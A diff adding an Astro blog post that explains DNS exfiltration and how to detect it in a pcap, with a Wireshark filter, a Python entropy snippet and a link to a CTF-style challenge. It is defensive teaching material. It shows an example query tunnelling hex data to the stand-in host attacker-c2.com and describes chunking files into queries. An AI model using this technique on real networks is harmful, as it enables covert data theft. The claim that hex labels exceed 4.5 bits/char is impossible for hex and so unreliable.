@@ -1,0 +1,81 @@
+---
+import Layout from '../../layouts/Layout.astro'
+
+const post = {
+  title: 'DNS Exfiltration — How Attackers Tunnel Data Through Name Queries',
+  date: '2026-06-29',
+  category: 'DEEP DIVE',
+  readTime: '8 min',
+  author: 'Nikola Pavlović',
+}
+const description = 'DNS was designed to translate names to IPs — not to carry stolen data. This post explains how attackers encode files in DNS queries, why firewalls miss it, and how to detect it in a pcap.'
+---
+<Layout title={post.title} description={description}>
+  <main class="shell post-page">
+    <div class="breadcrumb mono"><a href="/blog">blog</a> / {post.category.toLowerCase()}</div>
+
+    <article>
+      <header class="post-header">
+        <div class="post-meta mono">
+          <span class="post-cat">{post.category}</span>
+          <span>{post.date}</span>
+          <span>{post.readTime} read</span>
+          <span>by {post.author}</span>
+        </div>
+        <h1>{post.title}</h1>
+      </header>
+
+      <div class="post-body">
+        <p class="lead-para">{description}</p>
+
+        <h2>Why DNS is the perfect exfiltration channel</h2>
+        <p>Nearly every network — corporate, government, hospital — allows outbound DNS on UDP port 53. Block it and half the internet stops working. Attackers have known this for decades. DNS exfiltration abuses that trust by encoding stolen data inside the query itself, turning a protocol designed for name resolution into a covert data pipe.</p>
+        <p>A standard DNS query looks like this:</p>
+        <pre class="code-block"><code>query: www.google.com → 142.250.74.100</code></pre>
+        <p>An exfiltration query looks like this:</p>
+        <pre class="code-block"><code>query: 5a65726f5472757374.attacker-c2.com → (any response)</code></pre>
+        <p>The subdomain label <code>5a65726f5472757374</code> is hex-encoded data. The DNS server controlled by the attacker receives the query, decodes the label, and reassembles the stolen file from the stream of queries. The network logs just show "DNS traffic to attacker-c2.com" — which looks unremarkable to a firewall that only checks if port 53 traffic is reaching a real DNS server.</p>
+
+        <h2>How encoding works</h2>
+        <p>Each DNS label (the part between dots) can be up to 63 characters. The full query name can be up to 253 characters. Attackers use this space to carry encoded payloads. Common encodings:</p>
+        <ul>
+          <li><strong>Hex:</strong> Each byte becomes two characters. Simple, detectable by high-entropy labels.</li>
+          <li><strong>Base32:</strong> Used when the DNS infrastructure is case-insensitive. Produces labels like <code>mfra2mjb</code>. Denser than hex, still high-entropy.</li>
+          <li><strong>Base64url:</strong> Highest density but uses characters some DNS implementations reject.</li>
+        </ul>
+        <p>A typical exfiltration session breaks a file into chunks, encodes each chunk as a subdomain label, and sends one query per chunk. A 100 KB file at 50 bytes per label requires roughly 2,000 DNS queries — sent slowly enough to stay below anomaly thresholds.</p>
+
+        <h2>Detection signals</h2>
+        <p>No single signal catches DNS exfiltration reliably, but these patterns together are strong indicators:</p>
+        <ul>
+          <li><strong>High query rate to a single domain:</strong> Legitimate DNS lookups are bursty and varied. Hundreds of queries to one domain in a short window is unusual.</li>
+          <li><strong>Abnormal label length:</strong> Real hostnames rarely use 40+ character labels. Exfiltration labels are often at or near the 63-character maximum.</li>
+          <li><strong>High entropy in the subdomain:</strong> Random-looking strings (hex, base32) have entropy close to the theoretical maximum. Human-readable subdomains do not.</li>
+          <li><strong>NX or generic responses:</strong> The attacker's DNS server often returns <code>NXDOMAIN</code> or a static IP for all queries — it only cares about logging the query, not resolving it usefully.</li>
+          <li><strong>Sequential structure:</strong> Exfiltration tools often include a sequence number in the label — like <code>0001.data</code>, <code>0002.data</code> — so the server can reassemble chunks in order.</li>
+        </ul>
+
+        <h2>Walking through a pcap</h2>
+        <p>In Wireshark, filter with <code>dns</code> then look at the Info column. Exfiltration traffic immediately stands out because the query names are long and structurally identical — same domain, same label length, incrementing prefix.</p>
+        <p>Use <code>dns.qry.name contains "attacker-c2.com"</code> to isolate queries to the suspicious domain, then export the labels, strip the base domain, decode the base32/hex, and concatenate. You will recover the original file.</p>
+        <p>To calculate entropy on a set of labels from the terminal:</p>
+        <pre class="code-block"><code>python3 -c "
+import math, collections
+label = '5a65726f5472757374'
+freq = collections.Counter(label)
+entropy = -sum(p/len(label) * math.log2(p/len(label)) for p in freq.values())
+print(f'entropy: {entropy:.2f} bits/char')
+"</code></pre>
+        <p>A real hostname like <code>mail.google.com</code> has entropy around 3.0. An exfiltration label will be above 4.5.</p>
+
+        <h2>Practice it</h2>
+        <p>The <a href="/lab/challenges/dns-exfil">Silent Channel</a> challenge in FoilLab gives you a real packet capture with a DNS exfiltration session embedded in normal traffic. Your job is to identify the malicious queries, decode the data, and find the flag.</p>
+
+        <div class="post-footer">
+          <a href="/blog">← all posts</a>
+          <a href="/lab/challenges/dns-exfil" class="cta-link">Try the challenge →</a>
+        </div>
+      </div>
+    </article>
+  </main>
+</Layout>
